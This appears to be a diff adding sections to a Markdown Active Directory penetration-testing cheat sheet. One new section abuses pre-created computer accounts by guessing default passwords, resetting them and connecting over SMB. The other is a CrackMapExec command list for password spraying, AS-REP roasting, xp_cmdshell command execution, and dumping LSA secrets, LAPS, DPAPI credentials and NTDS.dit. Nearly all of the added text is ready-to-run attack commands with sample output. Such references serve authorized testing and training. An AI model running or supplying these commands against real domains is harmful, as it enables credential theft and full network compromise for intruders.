@@ -385,9 +385,50 @@ Exploitation:
     ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
     ```
 
+---
 
+# PRE-CREATED COMPUTER ACCOUNTS
+### FINDING PRE-CREATED COMPUTER ACCOUNTS
 
+For instance, the computer account `DavesLaptop$` would have the password `daveslaptop`
 
+- Note that when dealing with computer accounts, it is smart to escape the `$` with a `\`.
+
+```bash
+impacket-smbclient <domain>/<computer account>\$:<password>@<IP>
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)
+```
+
+Notice we have `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
+
+### Change The Password
+We can use either of these:
+- https://github.com/fortra/impacket/blob/master/examples/changepasswd.py
+- https://github.com/api0cradle/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+
+```bash
+python3 rpcchangepwd.py <domain>/<computer account>\$:<password>@<IP> -newpass P@ssw0rd                           31s
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Password was changed successfully.
+```
+
+### Connect to SMB with the new creds
+```bash
+impacket-smbclient <domain>/<computer account>\$:<new set password>@<IP>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# 
+
+```
+
+**- Reference : https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/**
+
+---
 
 ### Exploiting CVE-2021-42278 and CVE-2021-42287
 Download the epxloit script https://github.com/WazeHell/sam-the-admin
@@ -690,6 +731,146 @@ Get Hashes
 bash$ cme smb <target> -u username -p password --sam
 ```
 
+## CrackMapExec Cheat Sheet
+### Initial Enumeration
+```bash
+crackmapexec smb <ip>
+```
+
+### Testing null/guest authentication and listing shares
+```bash
+crackmapexec smb targets.txt -u '' -p '' --shares
+```
+
+```bash
+crackmapexec smb targets.txt -u 'Guest' -p '' --shares
+```
+
+### Enumerate users using ldap
+```bash
+crackmapexec ldap <domain> -u '' -p '' --users
+```
+
+```bash
+crackmapexec ldap <domain> -u users.txt -p "" -k
+```
+
+### Asreproast
+```bash
+crackmapexec ldap <domain> -u <username> -p "" --asreproast asrep.txt
+```
+
+### Bloodhound
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --bloodhound -ns <ip> --collection All
+```
+
+### Group Policy Preferences
+- https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -M gpp_password
+```
+
+### Creds Spray
+```bash
+crackmapexec smb targets.txt -u <username> -p <password>
+```
+
+### Password Spray
+```bash
+crackmapexec ldap <domain> -u users.txt -p <password> --continue-on-success
+```
+
+```bash
+crackmapexec ldap <domain> -u users.txt -p <password> --no-bruteforce --continue-on-success
+```
+
+### STATUS_NOT_SUPPORTED: NTLM protocol not supported
+In this case we can use the `-k` option which will use Kerberos protocol to authenticate.
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> -k
+```
+
+### List shares
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> -k --shares
+```
+
+### Spider_plus Module
+The module `spider_plus` allows you to list and dump all files from all readable shares
+#### List all readable files
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -k -M spider_plus
+```
+
+#### Dump all files
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -M spider_plus -o READ_ONLY=false
+```
+
+#### Dump a specific file
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -k --get-file <target_file> <output_file> --share <sharename>
+```
+
+
+### MSSQL
+#### Test authentication
+```bash
+crackmapexec mssql targets.txt -u <username> -p <password>
+```
+
+#### Execute commands using `xp_cmdshell`
+- `-X` for powershell and `-x` for cmd
+```bash
+crackmapexec mssql <domain> -u <username> -p <password> -X <command_to_execute>
+```
+
+#### Get a file
+```bash
+crackmapexec mssql <domain> -u <username> -p <password> --get-file <output_file> <target_file>
+```
+
+### Local Administrator authentication
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --local-auth
+```
+
+### Dump the LSA secrets
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --local-auth --lsa
+```
+
+### Recover the name of the gmsa account
+- https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent
+We have two possibilities to recover the name of the gmsa account:
+- Using the `--gmsa-convert-id` option:
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --gmsa-convert-id <id>
+```
+- Decrypt the gmsa account in lsa with `--gmsa-decrypt-lsa`:
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --gmsa-decrypt-lsa <gmsa_account>
+```
+
+### Dump LAPS password
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> --laps
+```
+
+### Dump the credentials of the dpapi
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> --laps --dpapi
+```
+
+### Dump NTDS.dit
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --ntds
+```
+
+### References
+- https://github.com/mpgn/CrackMapExec
+- https://wiki.porchetta.industries/smb-protocol/scan-for-vulnerabilities
 
 
 ## Crackmapexec to Empire agent
